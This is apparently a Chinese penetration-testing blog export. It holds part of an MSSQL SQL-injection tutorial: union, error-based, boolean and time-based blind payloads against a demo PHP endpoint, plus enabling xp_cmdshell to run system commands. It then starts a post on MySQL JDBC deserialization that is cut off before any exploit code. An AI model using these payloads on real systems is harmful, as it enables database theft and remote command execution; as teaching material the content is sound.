<p>在MSSQL数据库中会存在一个系统自带库–&gt;master，每个库都存在一个系统自带表–&gt;sysobjects。该系统表中对于我们来说有三个字段有用：</p>
<ul>
<li>NAME：表名信息</li>
<li>XTYPE： 代表 表的类型，S代表系统自带表，U代表用户创建表</li>
<li>ID：用于连接syscolumns表</li>
</ul>
<p>首先判断目标数据库是否是MSSQL数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 and exists(select * from sysobjects) --+</span><br></pre></td></tr></table></figure>

<p>返回正常说明网站使用的数据库是MSSQL</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280514056-1d5ed736-6607-41e8-b4c8-be5316676472.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280514056-1d5ed736-6607-41e8-b4c8-be5316676472.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>联合注入中必要的一步就是判断字段长度，当<code>order by 4</code>回显正常，但<code>order by 5</code>报错时，表明字段长度是3</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 order by 4 --+  正常</span><br><span class="line">SqlServer.php?id=101 order by 5 --+  报错</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280632611-aafdf99b-293c-4352-97d7-583c58c60f86.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280632611-aafdf99b-293c-4352-97d7-583c58c60f86.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>接下来就是寻找字符串的回显位置（前面select语句查询为空时，才会回显联合查询的东西）</p>
<p>可以看到，四个回显位均可以利用（正常渗透中，回显位不固定）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,4 --+ </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280830221-499a2f79-e52b-47bd-8bbe-0af4df071a1b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749280830221-499a2f79-e52b-47bd-8bbe-0af4df071a1b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>查询当前数据库的版本信息和名字</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,db_name(),3,@@version --+ </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281119355-7d4fd5ba-02ed-464c-a318-52ceeebc0ab0.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281119355-7d4fd5ba-02ed-464c-a318-52ceeebc0ab0.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<blockquote>
<p>此处需要注意，当联合注入的数据和前半部分的数据类型不匹配时，会出现报错</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281211809-ec2880ea-f667-478d-8c18-5232593c7e66.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749281211809-ec2880ea-f667-478d-8c18-5232593c7e66.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
</blockquote>
<p>查询表名，将获取到的数据库名和<code>.dbo.sysobjects</code>进行拼接，通过限制<code>xtype</code>为u，使用<code>TOP 1</code>进行限制，找出第一条查询到的用户创建表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 name from SchoolDB.dbo.sysobjects where xtype=&#x27;u&#x27;) --+ </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282258075-d68d6a5b-27a6-49e3-b992-9c026270f216.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282258075-d68d6a5b-27a6-49e3-b992-9c026270f216.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>查询第二条表名数据时，可以使用<code>and name != &#39;第一次输出中的表名&#39;</code>的方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 name from SchoolDB.dbo.sysobjects where xtype=&#x27;u&#x27; and name != &#x27;STUDENTS&#x27;) --+ </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282277131-f0d9112d-7702-4c8c-80c0-3e567dd07eaf.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749282277131-f0d9112d-7702-4c8c-80c0-3e567dd07eaf.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>获取列名，通过col_name、object_id等函数，遍历获取列名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id(&#x27;STUDENTS&#x27;),1) from sysobjects)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id(&#x27;STUDENTS&#x27;),2) from sysobjects)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 col_name(object_id(&#x27;STUDENTS&#x27;),3) from sysobjects)--+</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350362233-3bb50919-4dee-443d-a521-2cd26e378cfe.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350362233-3bb50919-4dee-443d-a521-2cd26e378cfe.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>获取数据，这里获取StudentID字段的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS WHERE StudentID != 101)--+</span><br><span class="line">SqlServer.php?id=0 union select 1,2,3,(select top 1 StudentID from STUDENTS WHERE StudentID != 101 and StudentID != 102)--+</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350783382-420b25f3-128f-4556-a68c-5f13562a33cb.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749350783382-420b25f3-128f-4556-a68c-5f13562a33cb.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h4 id="pnSUl">报错注入</h4>

<p>上面我们说过，MSSQL数据库是强类型语言数据库，当类型不一样时，会报错，配合子查询即可实现报错注入。可以利用的函数有以下这些：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">convert() </span><br><span class="line">file_name() </span><br><span class="line">db_name() </span><br><span class="line">col_name() </span><br><span class="line">filegroup_name()</span><br><span class="line">object_name() </span><br><span class="line">schema_name() </span><br><span class="line">type_name() </span><br><span class="line">cast()</span><br></pre></td></tr></table></figure>

<p>这里我们使用convert函数作为演示，convert函数语法如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CONVERT(data_type(length),data_to_be_converted,style)</span><br><span class="line">--注释 ：</span><br><span class="line">data_type(length) 转换为⽬标数据类型（带有可选的长度）</span><br><span class="line">data_to_be_converted 含有需要转换的值</span><br><span class="line">style 规定⽇期/时间的输出格式（可省略）</span><br></pre></td></tr></table></figure>

<p>对于<code>convert(int,@@version)</code>，convert函数会首先执行第二给参数指定的SQL查询，然后尝试将查询结果转为int类型。但是由于查询语句查询出来的结果时varchar类型，无法转为指定的int类型，因此convert函数会爆出一个SQLSever的错误消息，格式是<code>&quot;SQL查询结果&quot;无法转换为&quot;int&quot;类型</code>，这样攻击者就可以利用报错来获取到SQL的查询结果</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="keyword">convert</span>(<span class="type">int</span>,db_name())</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351877891-2432a32c-cfb1-4f2b-baf8-278e35bb21f1.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351877891-2432a32c-cfb1-4f2b-baf8-278e35bb21f1.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>除了使用函数以外，在两个不同类型的数据进行比较时，也会爆出SqlServer的错误信息，也是一种利用方法</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> db_name())</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351925683-be991476-3931-45a6-9e61-80ca7cab0cea.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749351925683-be991476-3931-45a6-9e61-80ca7cab0cea.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>首先查询数据库名</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>查询当前数据库</span><br><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> db_name(<span class="number">0</span>))</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查询第二个数据库</span><br><span class="line">SqlServer.php?id<span class="operator">=</span><span class="number">101</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> db_name(<span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<p>这里我们可以通过<code>for xml path</code>，查询所有数据库的名字，<code>FOR XML PATH(&#39;&#39;)</code> 表示输出 XML，但不加任何标签。通常可以配合<code>stuff()</code>使用，用来拼接多个值并去除第一个多余分隔符</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(name) from sys.databases for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))--</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749353320049-8a35d83b-9f4d-4d6b-8453-a046de1b53e5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749353320049-8a35d83b-9f4d-4d6b-8453-a046de1b53e5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>爆出所有表名，但是其中存在一些系统表，可以通过<code>xtype=&#39;U&#39;</code>来过滤出用户表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(name) from sysobjects WHERE xtype = &#x27;U&#x27; for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)) --+</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358034266-f1ca5108-e55a-4bbf-a10a-7e9b28f04240.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358034266-f1ca5108-e55a-4bbf-a10a-7e9b28f04240.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>接下来就是爆出<code>Students</code>表的所有字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 and  1=convert(int,stuff((select quotename(name) from SchoolDB.sys.columns where object_id=object_id(&#x27;Students&#x27;) for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;)) --</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358196631-3425d161-db38-4843-875e-78d885791f7b.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358196631-3425d161-db38-4843-875e-78d885791f7b.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>最后爆数据即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=convert(int,stuff((select quotename(StudentID) from Students for xml path(&#x27;&#x27;)),1,0,&#x27;&#x27;))--</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358344892-388847df-803f-478d-9e43-f21c93308625.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749358344892-388847df-803f-478d-9e43-f21c93308625.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>剩下的报错函数原理也是相似的，读者可以自行查阅资料</p>
<h4 id="IeAWT">布尔盲注</h4>

<p>如果存在没有回显位 或者 不能直接通过页面返回内容查看数据库信息时，我们就可以通过布尔盲注去查询信息。页面会根据用户输入只回显true和flase，则可以通过构造逻辑判断来得到想要的信息</p>
<p>首先需要我们去判断是存在盲注，使用以下注入语句测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//正常回显</span><br><span class="line">SqlServer.php?id=101 and 1=1--+</span><br><span class="line">//不正常回显</span><br><span class="line">SqlServer.php?id=101 and 1=2--+</span><br></pre></td></tr></table></figure>

<p>不管是对于数据库名、表名还是列名的盲注，流程都是相类似的</p>
<p>首先猜解数据库名的长度，正常回显时，说明我们的判断是正确的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//回显正常</span><br><span class="line">SqlServer.php?id=101 and len((select db_name()))=8--+</span><br><span class="line">//不正常回显</span><br><span class="line">SqlServer.php?id=101 and len((select db_name()))=4--+</span><br></pre></td></tr></table></figure>

<p>猜解数据库名字，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//获取数据库名的第一个字符ascii码为83</span><br><span class="line">SqlServer.php?id=101 and ascii(substring((select db_name()),1,1))=83 -- </span><br><span class="line">//获取数据库名的第一个字符ascii码为99</span><br><span class="line">SqlServer.php?id=101 and ascii(substring((select db_name()),1,1))=99 -- </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359514500-d4417e71-1035-4e8e-8349-26516dccc2e8.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359514500-d4417e71-1035-4e8e-8349-26516dccc2e8.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>后续的表名、列名和数据，只需要替换响应的SQL语句即可</p>
<h4 id="KxKAK">延时注入</h4>

<p>这里主要是使用<code>WAITFOR DELAY &#39;0:0:n&#39;</code>这个语句表示要延迟几秒，他的作用就是等待待定时间，然后再执行后续语句。如果将该语句成功注⼊后，会造成数据库返回记录和 Web请求也会响应延迟特定的时间。由于该语句不涉及条件判断等情况，所以容易注⼊成功。根据Web请求是否有延迟，渗透测试⼈员就可以判断网站是否存在注⼊漏洞。同时，由于该语句并不返回特定内容，所以它也是盲注的重要检测⽅法。</p>
<p>利用该注入语句，可以判断此处是否存在延时注入</p>
<p>观察浏览器f12，观察时间确认成功延时，代表存在漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 WAITFOR DELAY &#x27;0:0:5&#x27; --</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359997217-3ebd3e53-c8bb-4bfe-ac61-f51a6f57347e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749359997217-3ebd3e53-c8bb-4bfe-ac61-f51a6f57347e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>后续利用和布尔注入相类似，判断数据库名长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 if (len((select db_name()))=8) WAITFOR DELAY &#x27;0:0:5&#x27; --+ </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360255270-e63390ae-72d1-46a3-ad5e-13a58a6b6e05.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360255270-e63390ae-72d1-46a3-ad5e-13a58a6b6e05.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>然后一个字符一个字符进行猜解数据库名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 if (ascii(substring((select db_name()),1,1))=83) WAITFOR DELAY &#x27;0:0:5&#x27;-- </span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360227353-a350a9b9-fe3d-41f9-b34e-c424b1bb1b56.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749360227353-a350a9b9-fe3d-41f9-b34e-c424b1bb1b56.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>后续只需要替换SQL语句查询点，就可以注入其他数据</p>
<h2 id="zxVml">SqlServer命令执行</h2>

<p>MSSQL数据库中，存在<code>xp_cmdshell</code>函数：SQL中运行系统命令行的系统存储过程，允许 SQL Server 以服务账户的身份执行 Windows 命令或外部程序。如果该命令开启时，我们就可以执行系统命令。</p>
<p>我们现在在判断了网站权限是<code>sa</code>权限后，想要执行系统命令，就先要判断<code>xp_cmdshell</code>是否存在，当页面正常返回时，说明该命令是开启的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 and 1=(select count(*) from master.dbo.sysobjects where xtype = &#x27;x&#x27; and name = &#x27;xp_cmdshell&#x27;)</span><br></pre></td></tr></table></figure>

<p><code>xp_cmdshell</code>默认在mssql2000中是开启的，在mssql2005后版本默认禁止。2005的<code>xp_cmdshell</code>的权限一般是<code>system</code>，而2008多数为<code>nt authority\network service</code></p>
<p>但是如果有管理员<code>sa</code>权限，则可以用<code>sp_configure</code>重新开启</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">开启 xp_cmdshell：</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;,1;reconfigure;</span><br><span class="line">关闭 xp_cmdshell：</span><br><span class="line">exec sp_configure &#x27;show advanced options&#x27;, 1;reconfigure;</span><br><span class="line">exec sp_configure &#x27;xp_cmdshell&#x27;, 0;reconfigure</span><br></pre></td></tr></table></figure>

<p>可以使用堆叠的方式进行执行命令，但是有些命令的执行需要较高权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SqlServer.php?id=101 ;exec master..xp_cmdshell &quot;命令&quot;</span><br></pre></td></tr></table></figure>

<p>通过运行<code>whoami</code>，可以看到sqlserver的权限为<code>nt service\mssqlserver</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749362631456-529373c6-eb7f-4ed3-81ec-434d7ed409e5.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1749362631456-529373c6-eb7f-4ed3-81ec-434d7ed409e5.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>Sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>JDBC反序列化-MYSQL</title>
    <url>/2025/07/28/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-MYSQL/</url>
    <content><![CDATA[<h1 id="FwjsM">JDBC反序列化-MYSQL</h1>
<h2 id="nYWmb">前言</h2>

<p>文章首发于：<a href="https://www.freebuf.com/articles/vuls/433153.html">https://www.freebuf.com/articles/vuls/433153.html</a></p>
<p>已经好久没有写博客了，这段时间花了点时间学了点内网的知识，内网相关笔记后续可能会发了。这两天渗透的时候，进入到了一个若依系统中，发现有接口可以通过数据库连接源连接，想到了之前看过但是还没学习的JDBC反序列化的链子，今天学习一下。（要是之前就学了是不是这个就能打通了呢QwQ）</p>
<h2 id="gVQwK">JDBC基础</h2>

<p>这里简单说一下JDBC对数据库操作，包含以下几个步骤</p>
<ul>
<li>导入包：要求导入包含数据库编程所需要的JDBC类软件包，通常来说<code>import java.sql.*</code>就可以了</li>
<li>注册一个JDBC的驱动程序：要求初始化驱动程序，以便打开与数据库通信的通道</li>
<li>建立连接：需要使用<code>DirverManager.getConnect()</code>方法创建一个connection对象，该对象表示数据库服务器的物理连接。需要创建新的数据库，在准备数据库URL时，无需提供任何数据库名称</li>
<li>执行查询：需要使用Statement类型对象来创建SQL语句并将其提交到数据库。</li>
<li>清理：需要显示关闭所有数据库资源，而不是依赖JVM的垃圾回收</li>
</ul>
<p>这里我们来一个Demo来执行以上操作</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JDBC</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">JDBC_DRIVER</span> <span class="operator">=</span> <span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">DB_URL</span> <span class="operator">=</span> <span class="string">&quot;jdbc:mysql://localhost:3306/&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">USER</span> <span class="operator">=</span> <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">PASS</span> <span class="operator">=</span> <span class="string">&quot;123456&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Class.forName(JDBC_DRIVER);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Connecting to database...&quot;</span>);</span><br><span class="line">            conn = DriverManager.getConnection(DB_URL,USER,PASS);</span><br><span class="line"></span><br><span class="line">            System.out.println(<span class="string">&quot;Creating statement...&quot;</span>);</span><br><span class="line">            stmt = conn.createStatement();</span><br><span class="line"></span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;CREATE DATABASE STUDENTS&quot;</span>;</span><br><span class="line">            stmt.executeUpdate(sql);</span><br><span class="line">            System.out.println(<span class="string">&quot;Database created Successfully...&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">finally</span>&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(stmt!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    stmt.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(conn!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    conn.close();</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (SQLException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个JDBC反序列化，就是对MYSQL对<strong>服务器的请求</strong>的利用过程</p>
<p>其中MySQL客户端与服务器的完整交互过程大概如下图所示</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748525058887-95ee0ee9-3943-4c92-8251-7e7efa5a3eb4.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748525058887-95ee0ee9-3943-4c92-8251-7e7efa5a3eb4.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="Xy11d">JDBC反序列化漏洞</h2>

<p>如果攻击者能控制JDBC连接设置项，那么就可以通过将其指向恶意Mysql服务器，进行<code>ObjecInputStream.readObject()</code>的反序列化攻击从而RCE</p>
<p>具体来说，在JDBC连接MySQL服务端时，会有几个内置的SQL查询语句要执行，其中两个查询你结果集在MySQL客户端被处理时，会调用<code>ObjectInputStream.readObject()</code>进行反序列化操作。如果攻击者搭建恶意MySQL服务器来控制这两个查询结果集，并且攻击者可以控制JDBC连接设置项，那么就能触发MySQL JDBC反序列化漏洞</p>
<p>以下是两个可以利用的查询语句：</p>
<ul>
<li>SHOW SESSION STATUS</li>
<li>SHOW COLLATION</li>
</ul>
<h3 id="OhV2L">环境搭建</h3>

<p>pom.xml导入依赖如下</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.13<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="OfDEW">漏洞分析</h3>

<p>CC链子作为命令执行的部分，这里我们就需要去找一个JDBC合理的入口类，并且这个入口类要在JDBC连接过程中被自动执行，最终找到<code>com.mysql.cj.jdbc.result.ResultSetImpl</code>，他的<code>getObject()</code>方法调用了<code>readObject</code>方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748531728633-a4462054-8a88-46b3-b63b-154ac921895e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1748531728633-a4462054-8a88-46b3-b63b-154ac921895e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>JDBC通过MySQL数据库查询数据会返回一个结果集，将查询到结果返回给程序并将结果封装<code>ResultSetImpl</code>这个类 中</p>
<p>所以这个类不满足用户可控输入这一点，因此我们要去找哪里调用了<code>ResultSetImpl#getObject()</code>，最终找到<code>ResultSetUtil</code>类的<code>resultSetToMap</code>方法调用了<code>ResultSetImpl#getObject()</code>，并且能够继续向上去寻找调用</p>
